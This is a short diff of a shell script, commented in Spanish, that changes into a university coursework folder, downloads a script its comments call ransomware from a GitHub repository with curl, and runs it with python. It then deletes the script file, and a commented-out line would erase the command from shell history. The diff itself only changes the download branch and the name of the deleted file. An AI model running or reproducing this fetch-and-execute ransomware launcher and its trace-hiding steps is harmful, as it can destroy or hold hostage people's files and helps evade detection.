@@ -3,7 +3,7 @@
 cd Documentos/Facultad
 
 # Descargar script de ransomware
-curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/feat/ransomware/run.py
+curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-without-socket/run.py
 
 # Ejecutar script de ransomware
 python run.py
@@ -13,7 +13,7 @@ python run.py
 
 # Eliminar archivo de script
 cd ../..
-rm ransomware.sh
+rm s.sh
 
 # Eliminar ejecución de script del historial de comandos?
 # history -d (history | tail -n 2 | head -n 1 | awk '{print $1}')
